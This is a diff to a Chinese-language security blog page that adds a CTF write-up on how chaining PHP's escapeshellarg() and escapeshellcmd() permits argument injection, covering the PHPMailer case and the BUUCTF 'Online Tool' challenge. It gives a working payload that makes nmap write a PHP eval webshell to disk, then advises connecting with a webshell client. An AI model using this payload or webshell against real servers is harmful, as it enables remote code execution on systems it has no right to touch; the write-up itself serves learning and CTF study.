@@ -196,6 +196,156 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/27/escapeshell&escapecmd%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="NoahTie">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="NoahBox">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/04/27/escapeshell&escapecmd%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">php中的escapeshellarg+escapeshellcmd漏洞</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-04-27 22:34:00 / 修改时间：22:35:20" itemprop="dateCreated datePublished" datetime="2021-04-27T22:34:00+08:00">2021-04-27</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2021/04/27/escapeshell&escapecmd%E6%BC%8F%E6%B4%9E/" class="post-meta-item leancloud_visitors" data-flag-title="php中的escapeshellarg+escapeshellcmd漏洞" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2021/04/27/escapeshell&escapecmd%E6%BC%8F%E6%B4%9E/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/04/27/escapeshell&escapecmd%E6%BC%8F%E6%B4%9E/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="php中的escapeshellarg-escapeshellcmd漏洞"><a href="#php中的escapeshellarg-escapeshellcmd漏洞" class="headerlink" title="php中的escapeshellarg+escapeshellcmd漏洞"></a>php中的escapeshellarg+escapeshellcmd漏洞</h1><h2 id="0x01-escapeshellarg-与escapecmd"><a href="#0x01-escapeshellarg-与escapecmd" class="headerlink" title="0x01 escapeshellarg()与escapecmd()"></a>0x01 <code>escapeshellarg()</code>与<code>escapecmd()</code></h2><p><code>escapeshellarg()</code>与<code>escapecmd()</code>是php预置的用于防范命令注入攻击的函数，官方文档中给出的用法如下：</p>
+<hr>
+<h3 id="escapeshellcmd"><a href="#escapeshellcmd" class="headerlink" title="escapeshellcmd"></a>escapeshellcmd</h3><blockquote>
+<p><em>(PHP 4, PHP 5, PHP 7, PHP 8)</em><br>escapeshellcmd — shell 元字符转义</p>
+<h4 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h4><p><strong>escapeshellcmd</strong>    ( string <code>$command</code>   ) : string<br><strong>escapeshellcmd()</strong> 对字符串中可能会欺骗shell命令执行任意命令的字符进行转义。此函数保证用户输入的数据在传送到 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.exec.php">exec()</a> 或<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.system.php">system()</a> 函数，或者 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.operators.execution.php">执行操作符</a> 之前进行转义。  </p>
+<p>反斜线（\）会在以下字符之前插入：   &amp;#;`|*?~&lt;&gt;^()[]{}$\, <code>\x0A</code>   和 <code>\xFF</code>。 <code>&#39;</code> 和 <code>&quot;</code> 仅在不配对的时候被转义。   在 Windows 平台上，所有这些字符以及 <code>%</code> 和 <code>!</code> 字符都会被空格代替。  </p>
+<h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p><code>command</code>: 要转义的命令。           </p>
+<h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>转义后的字符串。  </p>
+</blockquote>
+<hr>
+<h3 id="escapeshellarg"><a href="#escapeshellarg" class="headerlink" title="escapeshellarg"></a>escapeshellarg</h3><blockquote>
+<p><em>(PHP 4 &gt;= 4.0.3, PHP 5, PHP 7, PHP 8)</em><br>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数</p>
+<h4 id="说明-1"><a href="#说明-1" class="headerlink" title="说明"></a>说明</h4><p><strong>escapeshellarg</strong>    ( string <code>$arg</code>   ) : string<br><strong>escapeshellarg()</strong> 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含  <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.exec.php">exec()</a>, <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.system.php">system()</a>    <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.operators.execution.php">执行运算符</a> 。  </p>
+<h4 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h4><p><code>arg</code>: 需要被转码的参数。           </p>
+<h4 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h4><p>转换之后字符串。  </p>
+</blockquote>
+<hr>
+<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p><img src="https://i.loli.net/2021/04/27/YEziXVo6DFwdZBC.png" alt="image-20210427175517136"></p>
+<ul>
+<li><p><code>escapeshellarg()</code>将字符串以特殊符号为分割进行拆分，并在拆分后的字符串首尾加上单引号，在单独的符号前加上了反斜线。</p>
+<p>通过另外一例可以更明显地看出来这一点：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="keyword">echo</span> escapeshellarg(<span class="string">&quot;Hanshu said:&#x27;i&#x27;m god!&#x27;&quot;</span>);</span><br><span class="line"><span class="string">&#x27;Hanshu said:&#x27;</span>\<span class="string">&#x27;&#x27;</span>i<span class="string">&#x27;\&#x27;&#x27;</span>m god!<span class="string">&#x27;\&#x27;&#x27;</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>经过这一步处理之后的字符串可以在终端中“安全”地输出：</p>
+<p><img src="https://i.loli.net/2021/04/27/ZhHwjGQtubs56CR.png" alt="image-20210427180547821"></p>
+</li>
+</ul>
+<ul>
+<li><code>escapeshellcmd()</code>为字符串中的特殊符号前添加反斜线。</li>
+</ul>
+<h2 id="0x02-漏洞"><a href="#0x02-漏洞" class="headerlink" title="0x02 漏洞"></a>0x02 漏洞</h2><h3 id="一个PHPMailer中的漏洞的简易分析"><a href="#一个PHPMailer中的漏洞的简易分析" class="headerlink" title="一个PHPMailer中的漏洞的简易分析"></a>一个PHPMailer中的漏洞的简易分析</h3><p>关于这两个函数的漏洞，在网上可以找到的最早的出处是PHPMailer的官方为了修复5.2.18前版本中出现的RCE漏洞而引入的新漏洞。</p>
+<p>PHPMailer源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">mailSend</span>(<span class="params">$header, $body</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $toArr = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;to <span class="keyword">as</span> $toaddr) &#123;</span><br><span class="line">        $toArr[] = <span class="keyword">$this</span>-&gt;addrFormat($toaddr);</span><br><span class="line">    &#125;</span><br><span class="line">    $to = implode(<span class="string">&#x27;, &#x27;</span>, $toArr);</span><br><span class="line">    </span><br><span class="line">    $param = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;Sender) <span class="keyword">and</span> <span class="keyword">$this</span>-&gt;validateAddress(<span class="keyword">$this</span>-&gt;Sender)) &#123;</span><br><span class="line">        $param = sprintf(<span class="string">&#x27;-f%s&#x27;</span>, escapeshellarg(<span class="keyword">$this</span>-&gt;Sender));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;Sender) <span class="keyword">and</span> !ini_get(<span class="string">&#x27;safe_mode&#x27;</span>) <span class="keyword">and</span> <span class="keyword">$this</span>-&gt;validateAddress(<span class="keyword">$this</span>-&gt;Sender)) &#123;</span><br><span class="line">        $old_from = ini_get(<span class="string">&#x27;sendmil_from&#x27;</span>);</span><br><span class="line">        ini_set(<span class="string">&#x27;sendmail_from&#x27;</span>, <span class="keyword">$this</span>-&gt;Sender);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* and more */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>php_mail的源代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (force_extra_parameters) &#123;</span><br><span class="line">    extra_cmd = php_escape_shell_cmd(force_extra_parameters);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (extra_cmd) &#123;</span><br><span class="line">    extra_cmd = php_escape_shell_cmd(extra_cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (php_mail(to_r, subject_r, message, headers_trimmed, extra_cmd TSRMLS_CC)) &#123;</span><br><span class="line">    RETVAL_TRUE;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    RETVAL_FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以注意到PHPMailer的源代码中第11行使用了<code>escapeshellarg()</code>，而在源码调用的php方法的源码的第3行中，又调用了<code>phpescapeshellcmd()</code>。</p>
+<p>正是这两个函数的连续调用造成了漏洞。</p>
+<p>将这个流程进行简化，大致就是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$payload = <span class="string">&quot;127.0.0.1&#x27; -o 1.php&quot;</span>;</span><br><span class="line">    $cmd = escapeshellcmd(escapeshellarg($payload));</span><br><span class="line">	<span class="keyword">echo</span> $cmd;</span><br><span class="line">	system(<span class="string">&quot;curl &quot;</span> . $cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里模拟了调用curl来获取文本页面回显，但是这里的payload导致原本应该回显在页面上的文本被保存为文件<code>1.php</code>。</p>
+<p><img src="https://i.loli.net/2021/04/27/2y3QmOZP4JDNiUn.png" alt="image-20210427212505557"></p>
+<p>可以发现进行过处理之后，payload变成了<code>&#39;127.0.0.1&#39;\\&#39;&#39; -o 1.php\&#39;</code>。在这个payload传入系统后发生了这些事情：</p>
+<ul>
+<li><code>&#39;127.0.0.1&#39;</code>当作引号包裹起来的字符串传入指令，相当于<code>127.0.0.1</code>。</li>
+<li><code>\\</code>被转义为单独的反斜杠，被当作网址后的路径分隔符。</li>
+<li><code>&#39;&#39;</code>成对的单引号被shell忽略。</li>
+<li><code>-o 1.php</code>被当作传入的参数，即原本在单引号中的字符串的一部分逃逸了引号，变成了参数。</li>
+<li><code> \&#39;</code>反斜杠转义的单引号。</li>
+</ul>
+<h3 id="漏洞的局限性及应对方法"><a href="#漏洞的局限性及应对方法" class="headerlink" title="漏洞的局限性及应对方法"></a>漏洞的局限性及应对方法</h3><p>如上例，最终保存的文件名将会是<code>1.php&#39;</code>，而并非我们期望的<code>1.php</code>。在许多指令中，只需要在<code>1.php</code>与<code>&#39;</code>之间添加一个空格即可。这时，引号将被当作单独的参数使用。</p>
+<h2 id="0x03-来看例题吧"><a href="#0x03-来看例题吧" class="headerlink" title="0x03 来看例题吧"></a>0x03 来看例题吧</h2><h3 id="题目地址"><a href="#题目地址" class="headerlink" title="题目地址"></a>题目地址</h3><p>[<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[BUUCTF">https://buuoj.cn/challenges#[BUUCTF</a> 2018]Online Tool](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[BUUCTF">https://buuoj.cn/challenges#[BUUCTF</a> 2018]Online Tool)</p>
+<h3 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = $_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">&quot;glzjin&quot;</span>. $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>3-5行、13-16行创建了一个目录，nmap指令将在这个目录下运行。</p>
+<p>10-12行是漏洞产生的位置，和PHPMailer中漏洞产生的原理相同，我们只需要想办法让指令输出文件到目录下就行。</p>
+<p>因为转义的缘故，shell的<code>&gt;</code>无法使用，但nmap有输出到文件的命令行参数<code>-oG</code>，构造payload：<code>&#39; &lt;?php eval($_POST[noah]);?&gt; -oG 1.php &#39; </code></p>
+<p><img src="https://i.loli.net/2021/04/27/KMftYhTGOwb8kdv.png" alt="image-20210427222444764"></p>
+<p>需要注意由于文件末尾还有其它信息，所以要加上末尾的<code>?&gt;</code>php标签。</p>
+<p>上传payload之后用蚁剑之类的工具连接webshell。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/27/DC-03/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1224,7 +1374,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-count">10</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1237,7 +1387,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-count">12</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
